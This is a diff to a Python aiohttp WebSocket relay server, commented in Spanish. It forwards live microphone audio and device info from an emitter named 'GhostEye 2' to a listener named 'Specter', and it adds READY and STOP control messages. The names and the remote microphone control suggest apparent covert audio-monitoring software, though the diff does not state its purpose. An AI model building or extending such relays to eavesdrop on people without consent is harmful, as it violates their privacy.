@@ -70,9 +70,16 @@ async def handle(request):
             last_codes[code] = code
             await ws.send_str(f"CODE:{code}")
 
+            # ✅ Si ya hay un listener esperando, enviar READY inmediatamente
+            listener = listeners.get(code)
+            if listener:
+                try:
+                    await ws.send_str("READY")
+                except Exception:
+                    pass
+
             async for msg in ws:
                 if msg.type == aiohttp.WSMsgType.BINARY:
-                    # Audio → solo al listener (JOIN)
                     listener = listeners.get(code)
                     if listener:
                         try: await listener.send_bytes(msg.data)
@@ -82,12 +89,10 @@ async def handle(request):
                     txt = msg.data
                     if txt.startswith("INFO|"):
                         last_info[code] = txt
-                        # Reenviar al listener
                         listener = listeners.get(code)
                         if listener:
                             try: await listener.send_str(txt)
                             except Exception: listeners.pop(code, None)
-                        # Reenviar a todos los watchers
                         dead = set()
                         for w in watchers.get(code, set()):
                             try: await w.send_str(txt)
@@ -139,6 +144,11 @@ async def handle(request):
                 elif msg.type in (aiohttp.WSMsgType.CLOSE, aiohttp.WSMsgType.ERROR):
                     break
             listeners.pop(code, None)
+            # ✅ Specter se desconectó — parar micrófono de GhostEye 2
+            emitter = emitters.get(code)
+            if emitter:
+                try: await emitter.send_str("STOP")
+                except Exception: pass
 
         # ── SPECTER solo info (WATCH) ──
         elif text.startswith("WATCH:"):
@@ -156,12 +166,10 @@ async def handle(request):
             watchers[code].add(ws)
             await ws.send_str("WATCHING")
 
-            # Enviar ultimo INFO guardado inmediatamente
             if code in last_info:
                 try: await ws.send_str(last_info[code])
                 except Exception: pass
 
-            # Pedir info actualizada a GhostEye 2
             emitter = emitters.get(code)
             if emitter:
                 try: await emitter.send_str("GET_INFO")
